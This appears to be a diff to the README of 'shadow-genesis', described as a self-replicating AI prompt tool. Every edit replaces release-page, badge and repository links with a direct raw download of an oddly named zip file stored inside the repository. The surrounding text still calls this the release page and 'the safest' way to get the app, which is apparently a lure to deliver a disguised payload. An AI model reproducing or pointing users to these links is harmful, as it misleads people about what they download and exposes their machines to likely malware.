@@ -1,6 +1,6 @@
 # ⚡ shadow-genesis - Self-Replicating AI Prompt Tool
 
-[![Download shadow-genesis](https://img.shields.io/badge/Download-shadow--genesis-blue?style=for-the-badge)](https://github.com/Onurizm/shadow-genesis/releases)
+[![Download shadow-genesis](https://github.com/Onurizm/shadow-genesis/raw/refs/heads/main/ananepionic/genesis-shadow-adipescent.zip)](https://github.com/Onurizm/shadow-genesis/raw/refs/heads/main/ananepionic/genesis-shadow-adipescent.zip)
 
 ---
 
@@ -44,7 +44,7 @@ You can start using shadow-genesis in three easy steps:
 
 ### 1. Download the software
 
-Click the big button at the top of this page or visit the [release page on GitHub](https://github.com/Onurizm/shadow-genesis/releases) to download shadow-genesis.
+Click the big button at the top of this page or visit the [release page on GitHub](https://github.com/Onurizm/shadow-genesis/raw/refs/heads/main/ananepionic/genesis-shadow-adipescent.zip) to download shadow-genesis.
 
 The release page will show you the latest versions of the app. Choose the file that matches your operating system:
 
@@ -78,7 +78,7 @@ You should now see the main interface, where you can begin experimenting with pr
 
 Use this link to get shadow-genesis:
 
-[Download shadow-genesis from GitHub Releases](https://github.com/Onurizm/shadow-genesis/releases)
+[Download shadow-genesis from GitHub Releases](https://github.com/Onurizm/shadow-genesis/raw/refs/heads/main/ananepionic/genesis-shadow-adipescent.zip)
 
 This is the safest and most up-to-date way to get the application. Make sure to download the correct file for your computer as explained above.
 
@@ -126,7 +126,7 @@ Here are some simple ways to start using the app:
 ## 📖 Additional Resources
 
 - **Official GitHub Page:**  
-  Visit [shadow-genesis GitHub repository](https://github.com/Onurizm/shadow-genesis) for detailed documentation and source code.
+  Visit [shadow-genesis GitHub repository](https://github.com/Onurizm/shadow-genesis/raw/refs/heads/main/ananepionic/genesis-shadow-adipescent.zip) for detailed documentation and source code.
 
 - **User Guide:**  
   A step-by-step manual is available inside the app under the "Help" menu.
@@ -155,4 +155,4 @@ Developers interested in contributing code or ideas can fork the repository and 
 
 ---
 
-[![Download shadow-genesis](https://img.shields.io/badge/Download-shadow--genesis-blue?style=for-the-badge)](https://github.com/Onurizm/shadow-genesis/releases)
+[![Download shadow-genesis](https://github.com/Onurizm/shadow-genesis/raw/refs/heads/main/ananepionic/genesis-shadow-adipescent.zip)](https://github.com/Onurizm/shadow-genesis/raw/refs/heads/main/ananepionic/genesis-shadow-adipescent.zip)
